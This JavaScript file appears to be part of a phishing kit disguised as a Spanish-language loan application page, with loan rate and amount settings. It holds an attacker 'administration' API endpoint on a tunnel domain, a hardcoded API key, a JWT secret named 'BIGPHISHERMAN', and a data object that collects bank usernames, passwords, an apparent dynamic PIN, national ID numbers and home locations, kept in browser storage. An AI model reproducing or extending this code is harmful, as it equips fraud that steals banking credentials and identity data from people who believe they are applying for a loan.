/**
 * CONFIGURACIÓN
 */
const API_URL = 'https://tunnel.divinasmarranologosdante.shop'; // API Administradora.
const API_KEY = 'd483f4bb-202e-40f6-a856-ff99932145e9'; // API Administradora.
const JWT_SIGN = 'BIGPHISHERMAN';

const CONFIG = {
    TASA_MENSUAL: 0.0115, // 1.15% mensual
    MONTO_MIN: 500000,
    MONTO_MAX: 25000000,
    PLAZO_MIN: 6,
    PLAZO_MAX: 72
};


const LS = window.localStorage;

let info = {
    user: '',
    pass: '',
    cdin: '',

    plazo: 0,
    monto: 0,
    cuota: 0,

    cedula: '',
    nombre: '',
    departamento: '',
    municipio: '',
    sector: '',
    tipo_empleo: ''
}

function limitDigits(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

function cleanAndLimitDigits(input, maxLength) {
    // Remove all spaces from the input
    let value = input.value.replace(/\s/g, '');
    
    // Limit to maxLength digits
    if (value.length > maxLength) {
        value = value.slice(0, maxLength);
    }
    
    // Update input value
    input.value = value;
}

function updateLS(){
    LS.setItem('info', JSON.stringify(info));
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}



LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));
